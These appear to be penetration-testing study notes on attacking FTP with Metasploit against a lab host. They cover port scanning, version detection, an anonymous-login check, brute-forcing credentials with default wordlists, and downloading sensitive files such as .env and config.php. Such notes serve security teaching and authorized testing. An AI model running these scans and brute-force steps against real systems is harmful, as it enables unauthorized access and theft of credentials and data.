## Overview

- **Port**: `21/TCP`
- **Purpose**: Transfers files between client and server.
- Often used to manage **web server content** (upload/download files).

## Security Notes

- Authentication: **username + password**
- **Anonymous login** often enabled if misconfigured (`anonymous` / `anonymous` or blank password)
- Credentials sent in **plaintext** (unless FTPS is used)

## Step-by-Step Workflow in Metasploit

### 1. **Check if FTP Port Is Open**
```msf
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.10
set PORTS 21
run
```

### 2. **Identify FTP Server Version**
```msf
use auxiliary/scanner/ftp/ftp_version
set RHOSTS 192.168.1.10
run
```

→ Reveals software (e.g., `vsftpd 3.0.3`) → guides exploit selection.

### 3. **Find Relevant Modules**
Reduce noise with targeted search:
```msf
search type:auxiliary name:ftp
```

### 4. **Test for Anonymous Login**
```msf
use auxiliary/scanner/ftp/anonymous
set RHOSTS 192.168.1.10
run
```
> ✅ Always try this first — common in labs and misconfigured servers.

### 5. **Brute-Force Credentials (If Needed)**
```msf
use auxiliary/scanner/ftp/ftp_login
set RHOSTS 192.168.1.10
set USER_FILE /usr/share/wordlists/metasploit/default_users.txt
set PASS_FILE /usr/share/wordlists/metasploit/default_pass.txt
run
```

### 6. **Download Files Manually (e.g., `secret.txt`)**
Metasploit **cannot download files via auxiliary modules** — use native FTP client:
```bash
ftp 192.168.1.10
# When prompted:
#   Name: anonymous
#   Password: anonymous (or leave empty)
ftp> ls                # List remote files
ftp> get secret.txt    # Download to current directory
ftp> quit
```

> 💡 Look for sensitive files: `secret.txt`, `.env`, `backup.zip`, `config.php`, etc.
> ⚠️ Never assume FTP is secure — always test for anonymous access and weak credentials.
